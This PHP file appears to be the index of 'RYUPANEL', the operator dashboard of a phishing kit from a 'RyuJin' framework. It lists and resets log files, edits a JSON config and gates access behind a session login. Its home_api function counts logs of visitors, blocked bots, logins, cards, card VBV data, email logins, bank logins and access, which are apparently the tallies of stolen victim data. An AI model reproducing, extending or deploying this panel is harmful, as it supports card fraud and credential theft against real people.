<?php
/** 
 * RYUPANEL 
 * 
 * @package RyuJin-FrameWork
 * @version 1.
 * @author ryujinsoft.
 * 
 */

session_start();
//error_reporting(0);

define('RP_ROOT',__DIR__);
define('RP_INC_PATH',RP_ROOT.'/inc/');
define('RP_STATIC_PATH',RP_ROOT.'/static/');
define('PUBLIC_PATH' , dirname(__DIR__));
define('XAPP_PATH', dirname(dirname(__DIR__)) .'/app/');

function get_method($method,$callback,$key = null)
{
    $key = ($key == null ) ? 'rp' : $key;

    if($_GET[''.$key.''] == $method)
    {
        return $callback();
    }else{
        return false;
    }
}

/** init **/

/** get statistic files */
function get_statistic()
{
    if(is_dir(PUBLIC_PATH.'/logs/'))
    {
        $scan = scandir(PUBLIC_PATH.'/logs/');
        foreach($scan as $log)
        {
            if(!preg_match("/log/",$log))continue;

            $data[] = $log;
        }
    }else{

        $data = ['no data available .log'];
    }

    return $data;
}

/** get configurations */
function get_config()
{
    if(file_exists(XAPP_PATH .'/config/config.json'))
    {
        return json_decode(file_get_contents(XAPP_PATH.'/config/config.json'), true);
    }else{

        return false;
    }
}

function save_config($data = [])
{
    

    $json = json_encode($data,JSON_PRETTY_PRINT);

    return file_put_contents(XAPP_PATH.'/config/config.json' , $json);
}

function reset_stats()
{

    
        if(is_dir(PUBLIC_PATH.'/logs/'))
        {
            $scan = scandir(PUBLIC_PATH.'/logs/');
            foreach($scan as $log)
            {
                if(!preg_match("/log/",$log))continue;
    
                @unlink(PUBLIC_PATH.'/logs/'.$log);
            }
        }
    
}

function shortnumber($num) {

    if($num>1000) {
  
          $x = round($num);
          $x_number_format = number_format($x);
          $x_array = explode(',', $x_number_format);
          $x_parts = array('K', 'M', 'B', 'T');
          $x_count_parts = count($x_array) - 1;
          $x_display = $x;
          $x_display = $x_array[0] . ((int) $x_array[1][0] !== 0 ? '.' . $x_array[1][0] : '');
          $x_display .= $x_parts[$x_count_parts - 1];
  
          return $x_display;
  
    }
  
    return $num;
  }
function count_stats($filename)
    {
      $dir = PUBLIC_PATH.'/logs/'.$filename.'.log';
      if(file_exists($dir)){
      $c = explode("\n",file_get_contents($dir));
      $c = count($c)-1;
      }else{
        $c=0;
      }
      return shortnumber($c);
    }

function home_api()
{
    $data['visitor'] = count_stats('visitor');
    $data['bot'] = count_stats('block');
    $data['login'] = count_stats('login');
    $data['card'] = count_stats('card');
    $data['vbv'] = count_stats('card-vbv');
    $data['pap'] = count_stats('pap');
    $data['email'] = count_stats('email_login');
    $data['bank'] = count_stats('bank');
    $data['access'] = count_stats('access');
    return $data;
}

function getApp()
{
    if(file_exists(XAPP_PATH . '/config/web.php')){
        require XAPP_PATH . '/config/web.php';
        return $config['web']['app_name'].' - '.$config['web']['version'];
    }else{
        return 'App name - @version ';
    }
}

if(empty($_SESSION['ryupanel_login']))
{
    require RP_INC_PATH.'signin.php';
}else{

    if(empty($_GET['api'])){

    /** call the header section **/
    require RP_STATIC_PATH.'header.php';

    /** manage dinamic content **/
    require RP_ROOT.'/content.php';

    /** call the footer section **/
    require RP_STATIC_PATH.'footer.php';
    }else{
        require RP_ROOT.'/content.php';
    }
}